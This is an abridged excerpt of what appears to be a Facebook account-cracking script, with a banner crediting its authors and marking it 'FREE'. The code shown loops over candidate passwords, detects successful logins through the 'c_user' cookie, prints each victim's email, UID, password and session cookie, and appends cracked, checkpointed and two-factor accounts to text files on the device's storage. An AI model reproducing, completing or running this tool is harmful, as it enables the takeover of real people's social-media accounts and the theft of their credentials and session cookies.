...
\033[1;37m[*] Author        : RIZWAN ULLAH

\033[1;37m[*] Github        : RIZWAN 

\033[1;37m[*] Status        : FREE

\033[1;37m[*] TEAM          : MR AUH

\033[1;37m[*] UPDATE BY     : AHSAM UL HAQ 
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('\r\033[1;32m[âˆš]---------------------[iTx RIZWAN Power-OK]--------------------[âˆš]\nEMAIL : '+uid+'\nUID   : '+cid+' âˆš '+ps+ '\nCOOKIE   : '+coki+'\n[âˆš]---------------------------------------------------[âˆš]')

                cek_apk(session,coki)

                open('/sdcard/iTx RIZWAN Power-OK.txt', 'a').write(cid+' | '+ps+'\n')
                ...
                print(f'\r{Red}[Ã—]--------------------[iTx RIZWAN Power-OK]---------------------[Ã—]\nEMAIL : '+uid+'\nUID   : '+cid+' âˆš '+ps+ '\n[Ã—]---------------------------------------------------[Ã—]\033[1;97m')

                open('/sdcard/iTx RIZWAN Power-CP.txt', 'a').write(cid+' | '+ps+'\n')
                ...
                open('/sdcard/iTx RIZWANPower-2F.txt', 'a').write(cid+' | '+ps+'\n')
        ...
        sys.stdout.write(f'\r\33[1;37m[iTx RIZWAN Power] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
